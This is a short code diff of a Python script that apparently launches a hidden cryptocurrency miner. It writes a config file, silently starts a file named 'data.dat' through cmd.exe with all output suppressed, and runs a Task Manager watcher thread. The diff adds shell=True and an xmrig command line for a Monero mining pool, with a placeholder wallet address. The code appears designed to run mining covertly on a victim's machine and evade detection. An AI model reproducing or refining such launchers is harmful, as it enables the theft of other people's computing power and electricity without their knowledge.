@@ -135,7 +135,7 @@ def start():
     with open("config.json", "w") as config:
         config.write(jsonfiledata)
     print("1")
-    subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"],shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print("2")
 
 
@@ -179,3 +179,6 @@ task = threading.Thread(target=task_manager_watcher)
 task.start()
 
 start()
+
+
+#xmrig -o xmr-eu1.nanopool.org:10300 -u CüzdanAdresiniz -p x --opencl --cuda --no-cpu
